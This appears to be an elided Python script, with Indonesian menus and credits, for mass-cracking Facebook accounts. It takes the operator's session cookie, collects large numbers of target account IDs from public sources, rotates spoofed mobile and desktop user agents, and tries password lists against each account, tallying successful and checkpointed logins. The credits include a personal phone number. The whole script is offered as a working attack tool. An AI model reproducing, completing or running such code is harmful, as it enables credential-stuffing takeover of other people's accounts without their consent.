...
pretty.install()
CON=sol()
ugen2='Mozilla/5.0 (Linux; Android 11; V1981A; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/9.8.10.0''
ugen='Mozilla/5.0 (Linux; Android 8.1.0; vivo Y83 Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/11.6.10.0''
cokbrut=[]
...
for xd in range(10000):
	...
	f='SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76'
	...
	l='Safari/537.36 Edg/103.0.1264.77'
...
for x in range(10):
	...
	i='WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 '
	j=random.randrange(1, 9)
	k=random.randrange(1, 9)
	l='Safari/537.36 OPR/89.0.4447.71'
...
╔════════════════════════════════════════╗
║[•] di recode oleh    : P A R I Z               ║
║[•] Whatsapp  : +62 89503236482           ║
╚════════════════════════════════════════╝''')
#--------------------[ BAGIAN-MASUK ]--------------#
def login():
	try:
...
def login_lagi334():
 ...
 |______\___/ \__, |_|_| |_|
		...
		cookie=input(f'  [{h}•{x}] Masukan Cookies :{H} ')
		...
		print(f' {H} LOGIN BERHASIL TUNNGU SEBENTAR ');time.sleep(1)
		os.system('python Brazzer.py')
	except Exception as e:
...
def menu(my_name,my_id):
	...
	print(f'{H} INFO UA YANG ANDA GUNAKAN : {uak}')
	print('')
	print(f'{H}[01:CRAK DARI PUBLIK MASSAL]')
	print(f'{H}[03:CHEK HASIL CRAK]')
	print(f' [00:KELUAR DARI SCRIPT]')
...
def dump_massal():
	try:
		...
		exit()
	try:
		jum = int(input('INGIN CRAK BERPA ID?: '))
	except ValueError:
	...
	try:
		print('')
		print(f'{H}BERHASIL TERKUMPUL:{h}'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{x}')
...
#OTW CRAK
def setting():
	print(f'{M}[01:CRAK DARI OLD ID]')
	print(f'{H}[02:CRAK DARI NEW ID]')
	print(f'{H}[03:CRAK DARI RANDOM JUST]')
	print('')
	hu = input('+ pilih : ')
	if hu in ['1','01']:
...
#		method.append('touch')
	...
	#else:
#		taplikasi.append('no')
	pwplus=input('>> Tambahkan Password Manual ( y/n ) ')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\rCRAKER(: {P}[{b}{loop}{P}/{u}{len(id)}{P}]—{P}[{H}{ok}{P}]—{P}[{k}{cp}{x}]—[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				cetak(nel(statuscp1,title='RID-CP'))
				...
				headapp={"user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; DUB-LX2 Build/HUAWEIDUB-LX2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/371.1.0.12.107;]"}
				if 'no' in taplikasi:
					ok+=1
...
def crackfree(idf,pwv):
	global loop,ok,cp
	sys.stdout.write(f"\r{H}CRAKER {P}[{bo}Mbasic{P}]{P}[{b}{loop}{P}/{p}{len(id)}{P}]—{P}[{H}{ok}{P}]—{P}[{k}{cp}{x}]—[{m}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
